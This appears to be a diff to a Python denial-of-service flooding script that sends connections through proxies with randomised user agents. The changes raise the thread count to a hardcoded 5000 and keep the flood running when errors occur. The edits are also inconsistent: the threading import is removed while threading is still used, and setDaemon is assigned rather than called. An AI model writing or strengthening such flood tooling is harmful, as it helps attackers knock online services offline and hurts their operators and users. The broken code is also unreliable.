@@ -1,5 +1,5 @@
 import ssl
-import threading
+import multiprocessing
 import socket
 import random
 import time
@@ -120,7 +120,7 @@ def Flood():
             s.close()
             print("Flood sent " + proxy[0] + ":" + proxy[1])
         except:
-            pass
+            time.sleep(1)
 
 if "--socksCrawler" in sys.argv:
     socksCrawler()
@@ -143,12 +143,9 @@ event = threading.Event()
 for _ in range(100):
     userAgent = UserAgent().random
     userAgentList.append(userAgent)
-for indexPicker in range(threadNumber):
-    thread = threading.Thread(target=Flood, daemon=True)
+for indexPicker in range(5000):
+    thread = threading.Thread(target=Flood)
+    thread.setDaemon = False
     thread.start()
 
-time.sleep(1)
 event.set()
-
-while True:
-    input()
